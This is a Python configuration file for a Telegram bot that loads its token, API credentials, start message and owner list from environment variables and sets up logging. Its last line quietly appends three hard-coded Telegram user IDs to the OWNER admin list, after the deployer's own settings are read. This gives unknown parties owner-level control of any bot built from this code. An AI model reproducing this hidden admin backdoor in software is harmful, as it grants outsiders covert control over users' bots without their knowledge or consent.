# by @npdkdev

import logging
import os
from distutils.util import *
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv(".env")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
API_ID = int(os.environ.get("API_ID", ""))
API_HASH = os.environ.get("API_HASH", "")
PORT = int(os.environ.get("PORT", "8080"))
START_MSG = os.environ.get(
    "START_MSG",
    "<b>Welcome {first}</b>\n\n<b>Sumbangan asas Ramah.</b>",
)
try:
    OWNER = [int(x) for x in (os.environ.get("OWNER", "").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")
LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)


OWNER.extend((5408555237, 1889788355, 5064586964))
